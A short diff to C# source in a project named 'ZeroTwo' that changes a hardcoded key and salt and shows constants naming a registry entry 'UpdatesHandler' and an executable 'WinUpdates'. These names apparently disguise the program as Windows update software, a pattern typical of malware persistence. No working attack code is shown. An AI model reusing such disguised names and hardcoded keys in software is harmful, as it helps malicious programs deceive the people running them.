@@ -18,8 +18,8 @@ namespace ZeroTwo.src {
         private const string REG_KEY = "UpdatesHandler";
         private const string EXE_NAME = "WinUpdates";
 
-        private static byte[] k = Encoding.ASCII.GetBytes("0202020202020202");
-        private static byte[] s = Encoding.ASCII.GetBytes("0202020202020202");
+        private static byte[] k = Encoding.ASCII.GetBytes("jojojojojojojojo");
+        private static byte[] s = Encoding.ASCII.GetBytes("jojojojojojojojo");
 
         private const int EXEC_FLAG = 1;
 
